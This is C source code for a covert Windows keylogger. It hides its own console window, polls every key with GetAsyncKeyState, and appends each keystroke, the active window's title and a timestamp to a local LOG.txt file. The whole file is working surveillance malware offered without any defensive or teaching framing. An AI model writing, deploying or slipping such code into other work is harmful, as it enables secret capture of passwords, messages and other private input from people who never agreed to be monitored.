#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

#define BUF_SIZE 256

// FUNCTION DECLARATIONS //
void HideWindow();
void GetCurrentApplication(char *prev_window, FILE* logfile);
void KeystrokeHandler(short key, FILE* logfile);

// MAIN FUNCTION //
int main(){
    HideWindow();
    char prev_window[BUF_SIZE];

    while(1){

        Sleep(10); // reduce CPU usage
        
        // loop thru keyboard characters
        for(short key = 8; key <= 222; key++){
            
            // check for key press
            // where -32767 means key is pressed
            if(GetAsyncKeyState(key) == -32767){
                
                // open/create keylog file then handle keystroke
                FILE* logfile;
                logfile = fopen("LOG.txt", "a");
                GetCurrentApplication(prev_window, logfile);
                
                KeystrokeHandler(key, logfile);
                fclose(logfile);
            }
        }
    }
    return 0;
}

// FUNCTION DEFINITIONS //

// hides the command prompt upon execution
void HideWindow(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); // set to 0 to not display
}

// finds the name of the current top-most window/application
void GetCurrentApplication(char *prev_window, FILE* logfile){
    HWND foreground = GetForegroundWindow();
    if (foreground){
        char curr_window[BUF_SIZE];
        GetWindowText(foreground, curr_window, BUF_SIZE);
        if(strcmp(curr_window, prev_window) != 0 && strcmp(curr_window,"")){
            time_t curr_time = time(NULL);
            char* curr_time_str = ctime(&curr_time);
            strncpy(prev_window, curr_window, strlen(curr_window));
            fprintf(logfile, "\nAPPLICATION: <%s> TIME: %s", curr_window, curr_time_str);
        }
    }
}

// writes to file the interpretation of keystroke
void KeystrokeHandler(short key, FILE* logfile){
    // upper case alphabet
    if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
        fputc(key, logfile);
    }
    // lower case alphabet
    else if(key > 64 && key < 91){
        fputc(key+32, logfile);
    }
    // special characters, virtual keys, etc.
    else{
        switch(key){    
            case VK_SPACE: fputs("[SPACE]", logfile); break;
            case VK_TAB: fputs("[TAB]", logfile); break;
            case VK_BACK: fputs("[BACKSPACE]", logfile); break;
            case VK_RETURN: fputs("[ENTER]", logfile); break;
            case VK_SHIFT: fputs("[SHIFT]", logfile); break;
            case VK_CONTROL: fputs("[CTRL]", logfile); break;
            case VK_MENU: fputs("[ALT]", logfile); break;
            case VK_DELETE: fputs("[DEL]", logfile); break;
            case VK_ESCAPE: fputs("[ESC]", logfile); break;
            case VK_CAPITAL: fputs("[CAPS LOCK]", logfile); break;
            case VK_OEM_1: fputs("[;:]", logfile); break;
            case VK_OEM_2: fputs("[/?]", logfile); break;
            case VK_OEM_3: fputs("[`~]", logfile); break;
            case VK_OEM_4: fputs("[ [{ ]", logfile); break;
            case VK_OEM_5: fputs("[\\|]", logfile); break;
            case VK_OEM_6: fputs("[ ]} ]", logfile); break;
            case VK_OEM_7: fputs("['\"]", logfile); break;
            case 187: fputc('+', logfile); break;
            case 188: fputc(',', logfile); break;
            case 189: fputc('-', logfile); break;
            case 190: fputc('.', logfile); break;
            case VK_NUMPAD0: fputc('0', logfile); break;
            case VK_NUMPAD1: fputc('1', logfile); break;
            case VK_NUMPAD2: fputc('2', logfile); break;
            case VK_NUMPAD3: fputc('3', logfile); break;
            case VK_NUMPAD4: fputc('4', logfile); break;
            case VK_NUMPAD5: fputc('5', logfile); break;
            case VK_NUMPAD6: fputc('6', logfile); break;
            case VK_NUMPAD7: fputc('7', logfile); break;
            case VK_NUMPAD8: fputc('8', logfile); break;
            case VK_NUMPAD9: fputc('9', logfile); break;
            case 48:
                if(GetAsyncKeyState(0x10)){ fputc(')', logfile); }
                else{ fputc('0', logfile); }
                break;
            case 49:
                if(GetAsyncKeyState(0x10)){ fputc('!', logfile); }
                else{ fputc('1', logfile); }
                break;
            case 50:
                if(GetAsyncKeyState(0x10)){ fputc('@', logfile); }
                else{ fputc('2', logfile); }
                break;
            case 51:
                if(GetAsyncKeyState(0x10)){ fputc('#', logfile); }
                else{ fputc('3', logfile); }
                break;
            case 52:
                if(GetAsyncKeyState(0x10)){ fputc('$', logfile); }
                else{ fputc('4', logfile); }
                break;
            case 53:
                if(GetAsyncKeyState(0x10)){ fputc('%', logfile); }
                else{ fputc('5', logfile); }
                break;
            case 54:
                if(GetAsyncKeyState(0x10)){ fputc('^', logfile); }
                else{ fputc('6', logfile); }
                break;
            case 55:
                if(GetAsyncKeyState(0x10)){ fputc('&', logfile); }
                else{ fputc('7', logfile); }
                break;
            case 56:
                if(GetAsyncKeyState(0x10)){ fputc('*', logfile); }
                else{ fputc('8', logfile); }
                break;
            case 57:
                if(GetAsyncKeyState(0x10)){ fputc('(', logfile); }
                else{ fputc('9', logfile); }
                break;
        }
    }
}